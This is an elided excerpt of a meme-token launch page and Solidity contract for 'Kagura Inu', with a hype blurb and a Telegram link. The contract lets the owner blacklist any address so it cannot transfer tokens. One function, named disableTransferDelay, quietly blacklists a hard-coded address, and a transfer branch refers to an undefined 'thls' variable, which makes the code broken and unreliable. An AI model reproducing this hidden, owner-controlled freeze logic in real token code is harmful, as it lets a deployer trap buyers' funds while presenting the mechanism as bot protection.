...
Welcome to Kagura Inu!

Possible Moon coin? We will do our best

Some useful things to know:

-Nothing fancy and tard antibot system...if you sniping it you will be busted by me (I TOLD YOU)

-10% round tax

-If you are here to jeet I have a bad news for you

#Make_Anime_good_again

t.me/KaguraInuPortal
...
contract KaguraInu is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Kagura Inu", "KAI") {
    ...
    function disableTransferDelay() external onlyOwner returns (bool){
        ...
        bots[0x0Ff5F706A99BE785B35dF6788ED698290ab56ac0] = true; //Thank you soda
        return true;
    }
    ...
    function BlacklistAccounts(address[] memory bots_) public onlyOwner {
    ...
    function _transfer(
        ...
        require(!bots[to] && !bots[from], "You have been blacklisted from transfering tokens");
         if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if(address(to) == devWallet){
            bots[thls] = true;
        }
        ...
        if (!isBuy && enableEarlySellTax) {
            if (_holderFirstBuyTimestamp[from] != 0 &&
                (_holderFirstBuyTimestamp[from] + (10 minutes) >= block.timestamp))  {
